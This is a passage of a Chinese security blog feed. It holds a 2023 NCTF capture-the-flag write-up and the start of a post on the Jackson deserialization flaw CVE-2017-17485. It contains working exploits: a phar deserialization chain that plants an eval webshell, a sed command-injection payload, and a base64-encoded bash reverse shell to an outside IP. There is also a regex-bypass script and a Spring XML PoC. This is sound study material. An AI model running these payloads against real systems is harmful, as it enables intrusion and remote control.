class="language-pgsql"><span class="comment">------WebKitFormBoundary4iNAMw9WsXYpvRh5</span></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;type&quot;</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql">click</span></span><br><span class="line"><span class="language-pgsql"><span class="comment">------WebKitFormBoundary4iNAMw9WsXYpvRh5</span></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;security&quot;</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql">a803333984</span></span><br><span class="line"><span class="language-pgsql"><span class="comment">------WebKitFormBoundary4iNAMw9WsXYpvRh5</span></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;form_id&quot;</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql"><span class="number">18</span></span></span><br><span class="line"><span class="language-pgsql"><span class="comment">------WebKitFormBoundary4iNAMw9WsXYpvRh5</span></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;upload_name&quot;</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql">upload-file<span class="number">-393</span></span></span><br><span class="line"><span class="language-pgsql"><span class="comment">------WebKitFormBoundary4iNAMw9WsXYpvRh5</span></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;upload-file&quot;; filename=&quot;drunkbaby1.png&quot;</span></span><br><span class="line"><span class="language-pgsql">Content-<span class="keyword">Type</span>: image/png</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql">test</span></span><br><span class="line"><span class="language-pgsql"><span class="comment">------WebKitFormBoundary4iNAMw9WsXYpvRh5</span></span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql"></span></span><br></pre></td></tr></table></figure><p>用 phar 伪协议去构造反序列化的 HTTP 请求如下</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/index.php/video?dl=cGhhcjovLy92YXIvd3d3L2h0bWwvd3AtY29udGVudC91cGxvYWRzL3dwX2RuZGNmN191cGxvYWRzL3dwY2Y3LWZpbGVzL2RydW5rYmFieTEucG5n&amp;a=system&amp;c=ls</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>120.27.148.152:8012</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6,ja;q=0.5,zh-TW;q=0.4,no;q=0.3,ko;q=0.2</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>aiovg_rand_seed=1541956646</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>构造 phar 的 EXP</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="title class_">class</span> <span class="title class_">WP_HTML_Token</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="title class_">public</span> $<span class="title class_">bookmark_name</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$on_destroy</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$bookmark_name</span>, <span class="variable">$on_destroy</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;bookmark_name = <span class="variable">$bookmark_name</span>;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;on_destroy = <span class="variable">$on_destroy</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">\WP_HTML_Token</span>(<span class="string">&#x27;echo \&#x27;&lt;?php @eval($_POST[&quot;nepnb&quot;]);?&gt;\&#x27; &gt; /var/www/html/nepnep.php&#x27;</span>, <span class="string">&#x27;system&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span> =<span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;GIF89A&lt;?php XXX __HALT_COMPILER(); ?&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>最后不论是文件上传还是 phar 生成，都踩了不少坑。</p><p>最后连上 shell 之后需要 suid 提权</p><img src="/2023/12/27/2023-NCTF-WP/suid.png" class><p>date suid </p><p>date -f 文件名</p><img src="/2023/12/27/2023-NCTF-WP/flag2.png" class><h2 id="wait-what"><a href="#wait-what" class="headerlink" title="wait what"></a>wait what</h2><p>做的时候就感觉是某种特性，看到 in 的时候感觉问题挺大的</p><img src="/2023/12/27/2023-NCTF-WP/in.png" class><p>搜了一下相关的特性 <a class="link" href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Operators/in">https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Operators/in<i class="fas fa-external-link-alt"></i></a></p><blockquote><p>如果指定的属性在指定的对象或其原型链中，则 <strong><code>in</code></strong> <strong>运算符</strong>返回 <code>true</code>。</p></blockquote><p>本地测试一下</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> banned_users = [<span class="string">&#x27;hacker&#x27;</span>]</span><br><span class="line"></span><br><span class="line">banned_users.<span class="title function_">push</span>(<span class="string">&quot;admin&quot;</span>)</span><br><span class="line"></span><br><span class="line">username=<span class="string">&#x27;admin&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> test2 = (username <span class="keyword">in</span> banned_users)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`使用in关键字匹配<span class="subst">$&#123;username&#125;</span>的结果为：<span class="subst">$&#123;test2&#125;</span>`</span>)</span><br><span class="line">    <span class="keyword">if</span> (test2) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;第二个判断匹配到封禁用户：&quot;</span>,username)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当 username &#x3D; ‘admin’ 时，返回 false，当 username &#x3D; ‘0’ 时，返回 true</p><p>由于 banned_users 为 Array 类型，不存在 admin 属性，因此 test2 实际上判断的是banned_users 中是否存在数组索引为 username 的值（由于对象的属性名称会被隐式转换为字符串，”0” 和 0 都可以作为数组索引）</p><p>这里过了第一步之后还有一步正则的过滤，比较明显的是 test 函数</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> test1 = banned_users_regex.<span class="title function_">test</span>(username)</span><br></pre></td></tr></table></figure><blockquote><p>test() 方法用于检测一个字符串是否匹配某个模式.</p></blockquote><p>由于 <code>new RegExp(regex_string, &quot;g&quot;)</code> 定义了 g 的全局标志</p><p>如果正则表达式设置了全局标志， <code>test()</code> 的执⾏会改变正则表达式 lastIndex 属性。连续地执⾏ <code>test()</code> ⽅法，后续的执⾏将会从 lastIndex 处开始匹配字符串</p><ul><li>example</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> &gt; <span class="keyword">let</span> r = <span class="regexp">/^admin$/g</span></span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="number">3</span> &gt; r.<span class="property">lastIndex</span></span><br><span class="line"><span class="number">4</span> <span class="number">0</span></span><br><span class="line"><span class="number">5</span></span><br><span class="line"><span class="number">6</span> &gt; r.<span class="title function_">test</span>(<span class="string">&quot;admin&quot;</span>)</span><br><span class="line"><span class="number">7</span> <span class="literal">true</span></span><br><span class="line"><span class="number">8</span></span><br><span class="line"><span class="number">9</span> &gt; r.<span class="property">lastIndex</span></span><br><span class="line"><span class="number">10</span> <span class="number">5</span></span><br><span class="line"><span class="number">11</span></span><br><span class="line"><span class="number">12</span> r.<span class="title function_">test</span>(<span class="string">&quot;admin&quot;</span>)</span><br><span class="line"><span class="number">13</span> <span class="literal">false</span></span><br><span class="line"><span class="number">14</span></span><br><span class="line"><span class="number">15</span> &gt; r.<span class="property">lastIndex</span></span><br><span class="line"><span class="number">16</span> <span class="number">0</span></span><br></pre></td></tr></table></figure><p>那么这里的攻击思路是什么呢，总结一下应该是想办法让 admin 这个用户的 lastIndex 被我们恶意修改为 <code>admin.length</code>。攻击分为两步走</p><p>1、访问 <code>/api/ban_user</code> 路由，构造数组传入，绕过 <code>in</code> 的过滤<br>2、访问 <code>/api/flag</code>，发两次包，就能够让 <code>r.lastIndex</code> 变成 <code>admin.length</code>，绕过 waf</p><p>但是这里实施起来还是有个问题，下面这段代码每次在请求时都会创建⼀个新的 <code>banned_users_regex</code> ，恢复其 lastIndex 位置为初始值 0</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">use</span>(<span class="keyword">function</span> (<span class="params">req, res, next</span>) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="title function_">build_banned_users_regex</span>()</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;封禁用户正则表达式（满足这个正则表达式的用户名为被封禁用户名）：&quot;</span>,banned_users_regex)</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">next</span>()</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>这里的绕过挺巧妙的，又用到了一个特性</p><p>现如果传⼊ <code>escapeRegExp(string)</code> 函数中的 string 参数为⾮字符串类型，则 string 不存在 replace 属性，会抛出TypeError，如此来绕过 regex 的更新</p><p>如此一来，最后的 EXP 就是</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">remote_addr=<span class="string">&quot;http://127.0.0.1&quot;</span></span><br><span class="line"></span><br><span class="line">rs = requests.Session()</span><br><span class="line"></span><br><span class="line">resp = rs.post(remote_addr+<span class="string">&quot;/api/register&quot;</span>,json=</span><br><span class="line">&#123;<span class="string">&quot;username&quot;</span>:<span class="string">&quot;test&quot;</span>,<span class="string">&quot;password&quot;</span>:<span class="string">&quot;test&quot;</span>&#125;)</span><br><span class="line"><span class="built_in">print</span>(resp.text)</span><br><span class="line"></span><br><span class="line">resp = rs.post(remote_addr+<span class="string">&quot;/api/ban_user&quot;</span>,json=</span><br><span class="line">&#123;<span class="string">&quot;username&quot;</span>:<span class="string">&quot;test&quot;</span>,<span class="string">&quot;password&quot;</span>:<span class="string">&quot;test&quot;</span>,<span class="string">&quot;ban_username&quot;</span>:&#123;<span class="string">&quot;toString&quot;</span>:<span class="string">&quot;&quot;</span>&#125;&#125;)</span><br><span class="line"><span class="built_in">print</span>(resp.text)</span><br><span class="line"></span><br><span class="line">resp = rs.post(remote_addr+<span class="string">&quot;/api/flag&quot;</span>,json=</span><br><span class="line">&#123;<span class="string">&quot;username&quot;</span>:<span class="string">&quot;admin&quot;</span>,<span class="string">&quot;password&quot;</span>:<span class="string">&quot;admin&quot;</span>&#125;)</span><br><span class="line"><span class="built_in">print</span>(resp.text)</span><br><span class="line"></span><br><span class="line">resp = rs.post(remote_addr+<span class="string">&quot;/api/flag&quot;</span>,json=</span><br><span class="line">&#123;<span class="string">&quot;username&quot;</span>:<span class="string">&quot;admin&quot;</span>,<span class="string">&quot;password&quot;</span>:<span class="string">&quot;admin&quot;</span>&#125;)</span><br><span class="line"><span class="built_in">print</span>(resp.text)</span><br></pre></td></tr></table></figure><img src="/2023/12/27/2023-NCTF-WP/flag3.png" class><h3 id="调试分析"><a href="#调试分析" class="headerlink" title="调试分析"></a>调试分析</h3><p>虽然理解了特性，不过我个人觉得不调试一下是很不清晰的，所以就又调试了一遍。</p><p>先来看第一遍发包的时候，传数组，确实能够看到抛出异常，导致 <code>lastIndex</code> 不会被重置。</p><img src="/2023/12/27/2023-NCTF-WP/debug1.png" class><p>接着去请求 <code>/api/flag</code>，去修改 <code>lastIndex</code>，第一次的时候，由于 <code>lastIndex</code> 还是 0，匹配 admin 为 true</p><img src="/2023/12/27/2023-NCTF-WP/index0.png" class><p>当第二次再发起请求的时候</p><img src="/2023/12/27/2023-NCTF-WP/index5.png" class><p>成功 bypass 了</p><h2 id="Webshell-Generator"><a href="#Webshell-Generator" class="headerlink" title="Webshell Generator"></a>Webshell Generator</h2><p>最开始 download.php 是有任意文件读取的，不能直接读 flag，需要执行 <code>/readflag</code>，所以需要 rce 的。核心聚焦于这一个文件上，generate.sh</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> -e</span><br><span class="line"></span><br><span class="line">NEW_FILENAME=$(<span class="built_in">tr</span> -dc a-z0-9 &lt;/dev/urandom | <span class="built_in">head</span> -c 16)</span><br><span class="line"><span class="built_in">cp</span> template.php <span class="string">&quot;/tmp/<span class="variable">$NEW_FILENAME</span>&quot;</span></span><br><span class="line"><span class="built_in">cd</span> /tmp</span><br><span class="line"></span><br><span class="line">sed -i <span class="string">&quot;s/KEY/<span class="variable">$KEY</span>/g&quot;</span> <span class="string">&quot;<span class="variable">$NEW_FILENAME</span>&quot;</span></span><br><span class="line">sed -i <span class="string">&quot;s/METHOD/<span class="variable">$METHOD</span>/g&quot;</span> <span class="string">&quot;<span class="variable">$NEW_FILENAME</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">realpath</span> <span class="string">&quot;<span class="variable">$NEW_FILENAME</span>&quot;</span></span><br></pre></td></tr></table></figure><p>sed -i 命令用于在文件中直接修改文本内容，而不是将输出打印到标准输出。使用该命令可以在不创建临时文件的情况下，直接修改原始文件的内容。</p><p>这里的 sed -i 的最终效果是修改 template.php 中的任意一个变量。</p><p>来看一下 <code>sed</code> 命令的官方文档</p><p><a class="link" href="https://www.gnu.org/software/sed/manual/">https://www.gnu.org/software/sed/manual/<i class="fas fa-external-link-alt"></i></a></p><p>GNU sed 可以通过 e 指令执⾏系统命令。闭合原先的s指令，执⾏ <code>/readflag</code>，会将 flag 插⼊到输出⽂件的第⼀⾏。⾃动跳转到 download.php 读取即可。</p><p>由此能够构造出的 payload 是</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/g;1e /readflag;s</span><br></pre></td></tr></table></figure><img src="/2023/12/27/2023-NCTF-WP/readflag.png" class><p>拿到 flag</p><img src="/2023/12/27/2023-NCTF-WP/flag4.png" class><p>反弹 shell 也是可以的（但是我复现失败了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">resp = requests.post(<span class="string">&quot;http://117.50.175.234:8001/index.php&quot;</span>,data=</span><br><span class="line">&#123;<span class="string">&quot;language&quot;</span>:<span class="string">&quot;PHP&quot;</span>,<span class="string">&quot;key&quot;</span>:<span class="string">&#x27;&#x27;&#x27;/g; 1e bash -c &quot;&#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjQuMjIyLjIxLjEzOC8zMzMzIDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; #s//&#x27;&#x27;&#x27;</span>,<span class="string">&quot;method&quot;</span>:<span class="string">&quot;1&quot;</span>,<span class="string">&quot;filename&quot;</span>:<span class="string">&quot;2&quot;</span>&#125;)</span><br><span class="line"><span class="built_in">print</span>(resp.status_code,resp.text)</span><br></pre></td></tr></table></figure><h2 id="EvilMQ"><a href="#EvilMQ" class="headerlink" title="EvilMQ"></a>EvilMQ</h2><p>有空再复现，最近太忙了。</p><p>想结合 QL 来看看，感觉上有可能成为一个新的攻击面。</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>总结一下，是很用心的比赛，出题质量很高</p>]]></content>
    
    
    <summary type="html">2023 NCTF WP</summary>
    
    
    
    <category term="WP" scheme="https://drun1baby.github.io/categories/WP/"/>
    
    
    <category term="WP" scheme="https://drun1baby.github.io/tags/WP/"/>
    
  </entry>
  
  <entry>
    <title>Jackson 反序列化（三）CVE-2017-17485</title>
    <link href="https://drun1baby.github.io/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%89%EF%BC%89CVE-2017-17485/"/>
    <id>https://drun1baby.github.io/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%89%EF%BC%89CVE-2017-17485/</id>
    <published>2023-12-07T12:06:09.000Z</published>
    <updated>2023-12-07T12:41:05.752Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-漏洞描述"><a href="#0x01-漏洞描述" class="headerlink" title="0x01 漏洞描述"></a>0x01 漏洞描述</h2><p>本次 Jackson 反序列化漏洞是基于 <code>org.springframework.context.support.ClassPathXmlApplicationContext</code><br>的利用链的。在开启 <code>enableDefaultTyping()</code>  或使用有问题的 <code>@JsonTypeInfo</code> 注解的前提下</p><p>可以通过 jackson-databind 来滥用 Spring 的 SpEL 表达式注入漏洞来触发 Jackson 反序列化漏洞的，从而达到任意命令执行的效果。</p><h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p>Jackson 2.7系列 &lt; 2.7.9.2<br>Jackson 2.8系列 &lt; 2.8.11<br>Jackson 2.9系列 &lt; 2.9.4</p><h3 id="利用限制"><a href="#利用限制" class="headerlink" title="利用限制"></a>利用限制</h3><p>需要额外的 jar 包，并非完全的 Jackson 漏洞</p><p>环境所用的 <strong>pom.xml</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.fasterxml.jackson.core<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jackson-databind<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.7.9.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.fasterxml.jackson.core<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jackson-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.7.9<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.fasterxml.jackson.core<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jackson-annotations<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.7.9<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-context<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.0.2.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-beans<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.0.2.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.0.2.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-expression<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.0.2.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-logging<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-logging<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="0x02-漏洞复现"><a href="#0x02-漏洞复现" class="headerlink" title="0x02 漏洞复现"></a>0x02 漏洞复现</h2><p><code>ClassPathXmlApplicationContext</code> 这个类是用来加载一些 XML 资源的，而最后的攻击实现也是如此</p><p><strong>PoC.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">PoC</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>  &#123;  </span><br><span class="line">        <span class="comment">//CVE-2017-17485  </span></span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;[\&quot;org.springframework.context.support.ClassPathXmlApplicationContext\&quot;, \&quot;http://127.0.0.1:8888/spel.xml\&quot;]&quot;</span>;  </span><br><span class="line">        <span class="type">ObjectMapper</span> <span class="variable">mapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title 